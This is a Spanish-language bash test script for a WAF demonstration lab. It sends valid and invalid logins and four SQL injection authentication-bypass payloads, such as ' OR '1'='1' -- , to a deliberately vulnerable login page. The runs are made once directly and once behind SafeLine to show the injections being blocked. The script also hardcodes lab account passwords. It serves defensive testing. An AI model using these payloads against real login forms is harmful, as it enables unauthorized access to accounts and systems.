#!/usr/bin/env bash
#
# lab01_sqli.sh - Matriz de pruebas para LAB-01 (SQL Injection en login)
#
# Ejecuta el mismo conjunto de solicitudes contra un origen de destino. Se usa
# dos veces en la demostracion: una contra Apache directo (Escenario A) y otra
# contra SafeLine (Escenario B), para comparar el resultado sin cambiar nada.
#
# USO
#   ./lab01_sqli.sh [URL_BASE] [--waf] [-v]
#
#   URL_BASE   Por defecto http://localhost/fa/sistemas
#   --waf      Invierte la expectativa de las pruebas de inyeccion:
#              deben quedar BLOQUEADAS en lugar de tener exito.
#   -v         Muestra el detalle de cada solicitud.
#
# EJEMPLOS
#   ./lab01_sqli.sh
#   ./lab01_sqli.sh http://192.168.100.22:8000/fa/sistemas --waf
#
# SALIDA
#   Codigo de salida 0 si todas las pruebas pasan segun la expectativa,
#   1 si alguna falla. Adecuado para encadenar en un script de video.
#
# -----------------------------------------------------------------------------

set -u

BASE_URL="http://localhost/fa/sistemas"
MODO_WAF=0
VERBOSE=0
TOTAL=0
PASS=0
FAIL=0
INYECCIONES_OK=0
INYECCIONES_BLOQ=0

# -----------------------------------------------------------------------------
# Argumentos
# -----------------------------------------------------------------------------
for arg in "$@"; do
    case "$arg" in
        --waf) MODO_WAF=1 ;;
        -v|--verbose) VERBOSE=1 ;;
        -h|--help) sed -n '2,30p' "$0"; exit 0 ;;
        http*) BASE_URL="${arg%/}" ;;
        *) echo "Argumento desconocido: $arg" >&2; exit 2 ;;
    esac
done

LOGIN_URL="$BASE_URL/login.php"
DASH_URL="$BASE_URL/dashboard.php"

# -----------------------------------------------------------------------------
# Presentacion
# -----------------------------------------------------------------------------
if [ "$MODO_WAF" -eq 1 ]; then
    ETIQUETA="Escenario B - detras de SafeLine"
    ESPERA_INY="bloqueada"
else
    ETIQUETA="Escenario A - Apache directo"
    ESPERA_INY="exitosa"
fi

echo "=============================================================================="
echo " LAB-01 - SQL Injection en autenticacion"
echo " $ETIQUETA"
echo " Destino: $BASE_URL"
echo " Inyecciones esperadas: $ESPERA_INY"
echo " Fecha:   $(date '+%Y-%m-%d %H:%M:%S')"
echo "=============================================================================="
echo

# -----------------------------------------------------------------------------
# prueba <descripcion> <usuario> <contrasena> <espera: entra|rechaza>
# -----------------------------------------------------------------------------
COOKIE=$(mktemp)
trap 'rm -f "$COOKIE"' EXIT

prueba() {
    local desc="$1" usuario="$2" clave="$3" espera="$4"
    local http obtener

    TOTAL=$((TOTAL + 1))
    rm -f "$COOKIE"

    # Login
    curl -s -o /dev/null -c "$COOKIE" -b "$COOKIE" \
         --data-urlencode "username=$usuario" \
         --data-urlencode "password=$clave" \
         "$LOGIN_URL"
    http=$?

    # Comprobar si hay sesion en el dashboard
    obtener=$(curl -s -b "$COOKIE" "$DASH_URL" \
              | grep -oP '(?<=Bienvenido, <strong>)[^<]+' | head -1)

    local actual="rechaza"
    [ -n "$obtener" ] && actual="entra"

    if [ "$actual" = "$espera" ]; then
        PASS=$((PASS + 1))
        printf "  [ PASA ] %-42s %s\n" "$desc" "${obtener:-rechazado}"
    else
        FAIL=$((FAIL + 1))
        printf "  [ FALLA] %-42s %s\n" "$desc" "${obtener:-rechazado}"
    fi

    if [ "$VERBOSE" -eq 1 ]; then
        echo "           usuario=[$usuario] clave=[$clave] curl=$http"
        echo "           cookie: $(grep SIGISESSID "$COOKIE" 2>/dev/null | awk '{print $7}' | head -1)"
    fi
}

# -----------------------------------------------------------------------------
# Pruebas de control
#
# Comportan el mismo con y sin WAF. Sirven para demostrar que SafeLine no
# rompe el uso normal de la aplicacion.
# -----------------------------------------------------------------------------
echo "-- Pruebas de control -----------------------------------------------"
prueba "admin + contrasena valida"          "admin"     "Admin_2026!"    "entra"
prueba "tecnico + contrasena valida"        "tecnico"   "Tecnico_2026!"  "entra"
prueba "m.quiroga + contrasena valida"      "m.quiroga" "Quiroga_2026!"  "entra"
prueba "admin + contrasena incorrecta"      "admin"     "incorrecta"     "rechaza"
prueba "usuario inexistente"                "noexiste"  "cualquiera"     "rechaza"
echo

# -----------------------------------------------------------------------------
# Pruebas de inyeccion
#
# Escenario A: deben entrar como admin.
# Escenario B: SafeLine debe bloquearlas.
# -----------------------------------------------------------------------------
if [ "$MODO_WAF" -eq 1 ]; then
    ESPERA="rechaza"
else
    ESPERA="entra"
fi

echo "-- Pruebas de inyeccion ---------------------------------------------"
prueba "admin' -- "            "admin' -- "            "loquesea"   "$ESPERA"
prueba "admin' #"              "admin' #"              "loquesea"   "$ESPERA"
prueba "' OR '1'='1' -- "      "' OR '1'='1' -- "      "loquesea"   "$ESPERA"
prueba "' OR 1=1#"             "' OR 1=1#"             "loquesea"   "$ESPERA"
echo

# -----------------------------------------------------------------------------
# Resumen
# -----------------------------------------------------------------------------
echo "=============================================================================="
printf " Resultado: %d de %d pruebas pasaron" "$PASS" "$TOTAL"
[ "$FAIL" -gt 0 ] && printf ", %d fallaron" "$FAIL"
echo

if [ "$MODO_WAF" -eq 0 ]; then
    if [ "$PASS" -eq "$TOTAL" ]; then
        echo " Escenario A correcto: las 4 inyecciones funcionaron sin proteccion."
        echo " Vulnerabilidad CONFIRMADA en $BASE_URL"
    else
        echo " Escenario A INESPERADO: se esperaba que las 4 inyecciones fueran"
        echo " exitosas. Revisar si el WAF ya esta en el camino o si cambio el codigo."
    fi
else
    if [ "$PASS" -eq "$TOTAL" ]; then
        echo " Escenario B correcto: las 4 inyecciones quedaron bloqueadas."
        echo " SafeLine DETUVO el ataque. Revisar que audit_log y login_attempts"
        echo " esten vacios para confirmar que el bloqueo fue antes de la app."
    else
        echo " Escenario B INESPERADO: alguna inyeccion pudo mas alla del WAF."
        echo " Revisar el modo de SafeLine (se recomienda Strict) y las reglas activas."
    fi
fi
echo "=============================================================================="

[ "$FAIL" -eq 0 ] && exit 0 || exit 1
